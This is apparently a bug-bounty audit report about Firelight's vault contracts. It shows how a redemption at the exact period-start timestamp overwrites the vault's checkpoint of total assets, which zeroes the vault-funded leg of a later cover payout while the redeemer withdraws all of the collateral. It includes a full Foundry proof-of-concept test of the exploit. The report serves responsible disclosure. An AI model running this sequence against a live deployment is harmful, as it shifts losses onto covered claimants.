# 89499 sc high same timestamp redemption creates competing withdrawal and cover liabilities against the same collateral

**Submitted on Aug 19th 2026 at 16:41:59 UTC by @Diavol0 for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #89499
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Protocol insolvency

## Description

### Brief/Intro

At the exact period-start timestamp `T`, an unprivileged staker can redeem all shares immediately after the allocator commits a valid `1,000` USD cover allocation. That redemption rewrites the vault's opening-assets checkpoint from `1,000` FXRP to zero even though the FXRP remains locked in the withdrawal queue. When a legitimate incident is later paid, the vault returns `0` for the `999` FXRP vault-funded leg; the staker then claims the full `1,000` FXRP withdrawal. The result is a direct shift of the valid incident loss from the covered claimant to the boundary redeemer, with no privileged-role abuse.

### Vulnerability Details

The capacity and payout paths both use an inclusive historical lookup:

```solidity
// CoverOrderAllocator._computeAvailableCapacity
uint256 totalAssetsCanonical = Decimals.convert(
    $.vault.totalAssetsAt($.vault.currentPeriodStart()),
    $.vaultAssetDecimals,
    CANONICAL_DECIMALS,
    Math.Rounding.Floor
);
```

```solidity
// FirelightVault.payout
uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);
paidAmount = Math.min(amount, Math.min(assetsAtCapturePeriod, activePayableAmount));
```

The vault records the withdrawal as a next-period entitlement, but logs the reduced active balance at the current block timestamp:

```solidity
// FirelightVault._requestWithdraw and withdraw/redeem flow
uint256 period = currentPeriod() + 1;
withdrawAssets[period] += assets;
pendingWithdrawAssets += assets;
...
_logTrace(owner, ownerBalance, _totalSupply, _totalAssets, true);
```

`_logTrace()` calls `Trace256.push(Time.timestamp(), _totalAssets)`. The custom checkpoint implementation replaces the last value when the key is equal to the last key:

```solidity
if (exists && key == lastKey) {
    self._values[len - 1] = value;
}
```

`totalAssetsAt()` uses `upperLookupRecent`, which returns the last checkpoint with a key lower than or equal to the requested timestamp. Consequently, the following normal transaction sequence is sufficient. The critical condition is `block.timestamp == T == vault.currentPeriodStart()` for the redemption; a withdrawal after the boundary does not rewrite the lookup for `T`.

1. During period `P-1`, a valid order for `1,000` USD of cover for period `P` is authored.
2. At the exact start timestamp `T` of `P`, the honest allocator commits the order first. The vault has `1,000` FXRP of active assets, so the matcher commits `1,000` USD of capacity (within the total capacity, which also includes any configured FLB). This is the normal period-start matcher transaction; it does not exceed allocator permissions.
3. In the same block timestamp, the staker redeems all shares. The redemption is assigned to `withdrawAssets[P+1]`, so the FXRP remains in the vault and remains exposed to payout. If no checkpoint already exists at `T`, the redemption appends one; if a checkpoint at `T` already exists, `Trace256.push` overwrites it. In either case, the same-timestamp trace entry records zero active assets and changes the value returned by `totalAssetsAt(T)`.
4. After the ordinary settlement grace period, the order settles successfully using the already stored commitment.
5. A legitimate incident captured during `P` is assessed and approved. `payout()` maps the capture back to `T`, reads the changed zero checkpoint, and caps the vault-funded leg at zero. A funded FLB leg, if present, remains a separate waterfall leg; the supplied PoC funds only `1` FLB so it can assert that the `999` FXRP vault remainder is capped at zero. The pending withdrawal is not reduced by that call.
6. Once the withdrawal period is claimable, the staker claims the full `1,000` FXRP.

This is not a privileged-role bypass, stale oracle data, or FLB allowance failure. Every role follows the documented order, commit, settlement, incident, assessment, and approval flow; the unprivileged staker's ordinary redemption is the only adversarial action. The redeemer benefits by avoiding the haircut that should apply to its already-exposed collateral, while the covered beneficiary loses the vault-funded leg. The bug is the mutable same-timestamp historical value used as if it were an immutable opening exposure snapshot.

### Impact Details

The selected in-scope impact is **Critical - Protocol Insolvency**. This is not a lack-of-liquidity or temporary bank-run condition: the vault physically retains the full `1,000` FXRP and can transfer it to the withdrawal claimant, but the same collateral simultaneously backs a valid settled cover obligation and a `1,000` FXRP pending withdrawal. Including the separate `1` FLB first-loss leg, the obligations are `1,000` FXRP pending withdrawal plus `999` FXRP vault payout plus `1` FLB, while the backing is only `1,000` FXRP plus `1` FLB. The resulting shortfall is `999` FXRP.

* `1,000` FXRP is used to commit `1,000` USD of period-`P` capacity;
* the same `1,000` FXRP is moved to a pending withdrawal at `T`;
* the valid incident requests a `999` FXRP vault leg, but `vaultPaidAmount == 0` because `assetsAtCapturePeriod == 0` (the separate `1` FLB leg is paid first);
* the redeemer subsequently claims all `1,000` FXRP.

The affected claimant receives no vault-funded assets even though the cover was honestly committed and settled, while the redeemer claims the full withdrawal entitlement. No privileged role acts maliciously or exceeds its authority; the redeemer uses only a public withdrawal function and benefits by preserving its own exposed claim. The exact-timestamp condition limits reachability, but it does not change the impact classification: when the ordering occurs, the protocol's valid underwritten obligation exceeds the backing available to satisfy both claims.

### References

* [CoverOrderAllocator.sol commitment validation](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L332-L403) - commitment validation.
* [CoverOrderAllocator.sol opening capacity](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L696-L724) - raw opening collateral calculation.
* [FirelightVault.sol at the audited commit](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L451-L459) - inclusive `totalAssetsAt()` lookup.
* [FirelightVault.sol withdrawal and payout paths](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L717-L777) and [payout](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L892-L966) - delayed withdrawal and mutable payout cap accounting.
* [FirelightVault.sol checkpoint logging](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L994-L1056) - withdrawal trace update at the current timestamp.
* [Checkpoints.sol at the audited commit](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/lib/Checkpoints.sol#L198-L224) - same-key replacement and inclusive lookup behavior.
* [Firelight Phase 2 explanation](https://firelight.finance/articles/everything-stakers-need-to-know-about-phase-2) - protocol context for delayed unstaking and coverage exposure.

## Proof of Concept

The following is a complete Foundry test. Place it in a Foundry test directory with the repository's existing `forge-std`, OpenZeppelin, and `firelight/` remappings, then run the test with a London-compatible EVM and Solidity `0.8.28`.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import {FirelightVault} from "firelight/core/FirelightVault.sol";
import {CoverNFT} from "firelight/core/CoverNFT.sol";
import {CoverOrderAllocator} from "firelight/core/CoverOrderAllocator.sol";
import {IncidentManager} from "firelight/core/IncidentManager.sol";
import {ICoverOrderAllocator} from "firelight/core/interfaces/ICoverOrderAllocator.sol";
import {IFirelightVault} from "firelight/core/interfaces/IFirelightVault.sol";
import {IIncidentManager} from "firelight/core/interfaces/IIncidentManager.sol";
import {IAggregatorV3} from "firelight/core/interfaces/IAggregatorV3.sol";

contract LifecycleToken is ERC20 {
    uint8 internal immutable tokenDecimals;

    constructor(string memory name_, string memory symbol_, uint8 decimals_) ERC20(name_, symbol_) {
        tokenDecimals = decimals_;
    }

    function decimals() public view override returns (uint8) {
        return tokenDecimals;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract LifecycleFeed is IAggregatorV3 {
    uint8 public constant override decimals = 18;

    function description() external pure override returns (string memory) {
        return "FXRP/USD";
    }

    function version() external pure override returns (uint256) {
        return 1;
    }

    function getRoundData(uint80) external view override returns (uint80, int256, uint256, uint256, uint80) {
        return (1, 1e18, block.timestamp, block.timestamp, 1);
    }

    function latestRoundData() external view override returns (uint80, int256, uint256, uint256, uint80) {
        return (1, 1e18, block.timestamp, block.timestamp, 1);
    }
}

contract BoundaryRedeemPoC is Test {
    uint48 internal constant START = 1_700_000_000;
    uint256 internal constant UNIT = 1e6;

    address internal constant STAKER = address(0xA11CE);
    address internal constant BUYER = address(0xB0B);
    address internal constant PAYOUT_RECEIVER = address(0xBEEF);
    address internal constant PREMIUM_COLLECTOR = address(0xC011EC7);
    address internal constant EMPTY_FLB_WALLET = address(0xF1B);

    LifecycleToken internal fxrp;
    LifecycleToken internal premium;
    LifecycleToken internal flb;
    LifecycleFeed internal feed;
    FirelightVault internal vault;
    CoverNFT internal coverNFT;
    CoverOrderAllocator internal allocator;
    IncidentManager internal incidents;
    bytes32 internal marketId;

    function setUp() public {
        vm.warp(START);
        fxrp = new LifecycleToken("FXRP", "FXRP", 6);
        premium = new LifecycleToken("USDC", "USDC", 6);
        flb = new LifecycleToken("FLB", "FLB", 6);
        feed = new LifecycleFeed();

        FirelightVault vaultImplementation = new FirelightVault();
        FirelightVault.InitParams memory vaultParams = FirelightVault.InitParams({
            defaultAdmin: address(this),
            limitUpdater: address(this),
            blocklister: address(this),
            pauser: address(this),
            periodConfigurationUpdater: address(this),
            rescuer: address(this),
            depositLimit: 10_000 * UNIT,
            periodConfigurationDuration: 1 days
        });
        vault = FirelightVault(
            address(
                new ERC1967Proxy(
                    address(vaultImplementation),
                    abi.encodeCall(
                        FirelightVault.initialize,
                        (IERC20(address(fxrp)), "Firelight Vault", "fFXRP", abi.encode(vaultParams))
                    )
                )
            )
        );

        CoverNFT nftImplementation = new CoverNFT();
        coverNFT = CoverNFT(
            address(
                new ERC1967Proxy(
                    address(nftImplementation),
                    abi.encodeCall(
                        CoverNFT.initialize,
                        ("Firelight Cover", "COVER", "", address(this), address(0), address(0), address(0))
                    )
                )
            )
        );

        ICoverOrderAllocator.Market[] memory markets = new ICoverOrderAllocator.Market[](1);
        markets[0] = ICoverOrderAllocator.Market({chainId: 1, protocol: "Aave", market: bytes32("USDC")});
        marketId = keccak256(abi.encode(uint64(1), string("Aave"), bytes32("USDC")));

        ICoverOrderAllocator.ProtocolConcentrationInput[] memory concentrations =
            new ICoverOrderAllocator.ProtocolConcentrationInput[](1);
        concentrations[0] = ICoverOrderAllocator.ProtocolConcentrationInput({
            chainId: 1, protocol: "Aave", maxProtocolConcentrationBps: 10_000
        });

        address[] memory premiumTokens = new address[](1);
        premiumTokens[0] = address(premium);

        ICoverOrderAllocator.CapacityConfig memory capacity = ICoverOrderAllocator.CapacityConfig({
            minCAR: 12_000,
            firstLossBufferToken: IERC20(address(flb)),
            firstLossBuffer: EMPTY_FLB_WALLET,
            effectiveLeverage: 12_000,
            minOrderMarketCoverAmount: UNIT * 1e12,
            divergenceToleranceBps: 0
        });

        CoverOrderAllocator allocatorImplementation = new CoverOrderAllocator();
        ICoverOrderAllocator.InitParams memory allocatorParams = ICoverOrderAllocator.InitParams({
            vault: IFirelightVault(address(vault)),
            premiumCollector: PREMIUM_COLLECTOR,
            coverNFT: coverNFT,
            priceFeedAdapter: feed,
            maxPriceAge: 1 hours,
            premiumTokens: premiumTokens,
            admin: address(this),
            adminRole: address(this),
            curatorRole: address(this),
            allocatorRole: address(this),
            configAdminRole: address(this),
            initialProtocolConcentrations: concentrations,
            newMarkets: markets,
            capacityConfig: capacity
        });
        allocator = CoverOrderAllocator(
            address(
                new ERC1967Proxy(
                    address(allocatorImplementation), abi.encodeCall(CoverOrderAllocator.initialize, (allocatorParams))
                )
            )
        );
        coverNFT.grantRole(coverNFT.MINTER_ROLE(), address(allocator));

        IncidentManager incidentImplementation = new IncidentManager();
        incidents = IncidentManager(
            address(
                new ERC1967Proxy(
                    address(incidentImplementation),
                    abi.encodeCall(
                        IncidentManager.initialize,
                        (
                            address(this),
                            address(this),
                            address(this),
                            address(this),
                            address(this),
                            address(this),
                            address(this),
                            address(this),
                            PAYOUT_RECEIVER,
                            allocator,
                            feed,
                            uint48(1 hours)
                        )
                    )
                )
            )
        );

        vault.grantRole(vault.PAYOUT_ROLE(), address(incidents));
        vault.grantRole(vault.INCIDENT_ROLE(), address(incidents));
        vault.grantRole(vault.PAYOUT_ALLOWLIST_ROLE(), address(this));
        vault.addToPayoutAllowlist(PAYOUT_RECEIVER);

        fxrp.mint(STAKER, 1_000 * UNIT);
        vm.startPrank(STAKER);
        fxrp.approve(address(vault), type(uint256).max);
        vault.deposit(1_000 * UNIT, STAKER);
        vm.stopPrank();

        premium.mint(BUYER, 100 * UNIT);
        vm.prank(BUYER);
        premium.approve(address(allocator), type(uint256).max);

        ICoverOrderAllocator.MarketAllocationInput[] memory orderMarkets =
            new ICoverOrderAllocator.MarketAllocationInput[](1);
        orderMarkets[0] = ICoverOrderAllocator.MarketAllocationInput({
            marketId: marketId, coverRateAnnual: 1_000, coverAmount: 1_000 * 1e18
        });
        allocator.createCoverOrder(
            BUYER, BUYER, "beneficiary", address(premium), orderMarkets, ICoverOrderAllocator.CoverOrderType.NEW
        );
    }

    function test_periodBoundaryRedeemErasesPayoutCap() public {
        allocator.setSettlementGracePeriod(1 hours);
        uint48 boundary = START + 1 days;
        vm.warp(boundary);

        flb.mint(EMPTY_FLB_WALLET, 1 * UNIT);
        vm.prank(EMPTY_FLB_WALLET);
        flb.approve(address(incidents), type(uint256).max);

        ICoverOrderAllocator.MarketCoverAllocation[] memory allocations =
            new ICoverOrderAllocator.MarketCoverAllocation[](1);
        allocations[0] = ICoverOrderAllocator.MarketCoverAllocation({marketId: marketId, allocatedCover: 1_000 * 1e18});
        bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(uint256(0), allocations))));

        allocator.commitAllocation(1, leaf, 1_000 * 1e18, 1_000 * 1e18);
        assertEq(allocator.getAllocationCommitment(1).totalAvailableCapacity, 1_000 * 1e18);

        uint256 stakerShares = vault.balanceOf(STAKER);
        vm.prank(STAKER);
        vault.redeem(stakerShares, STAKER, STAKER);

        assertEq(vault.totalAssetsAt(boundary), 0);
        assertEq(vault.pendingWithdrawAssets(), 1_000 * UNIT);
        assertEq(fxrp.balanceOf(address(vault)), 1_000 * UNIT);

        vm.warp(boundary + 1 hours);
        allocator.settleCoverOrder(0, allocations, new bytes32[](0));
        assertEq(allocator.getCoverOrder(0).allocatedCoverAmount, 1_000 * 1e18);

        uint256 incidentId = incidents.createIncident(
            uint48(block.timestamp), "covered loss", keccak256("boundary-redeem-incident")
        );
        incidents.confirmIncident(incidentId, "ipfs://report");
        IIncidentManager.AssessmentLoss[] memory losses = new IIncidentManager.AssessmentLoss[](1);
        losses[0] = IIncidentManager.AssessmentLoss({coverTokenId: 0, marketId: marketId, amount: 1_000 * 1e18});
        incidents.addAssessmentLosses(incidentId, losses);
        incidents.submitCurrentAssessment(incidentId);
        incidents.approveCurrentAssessment(incidentId);

        assertEq(flb.balanceOf(PAYOUT_RECEIVER), 1 * UNIT);
        assertEq(fxrp.balanceOf(PAYOUT_RECEIVER), 0);
        assertEq(vault.pendingWithdrawAssets(), 1_000 * UNIT);

        vm.warp(START + 3 days);
        vm.prank(STAKER);
        assertEq(vault.claimWithdraw(2), 1_000 * UNIT);
        assertEq(fxrp.balanceOf(STAKER), 1_000 * UNIT);
    }
}
```
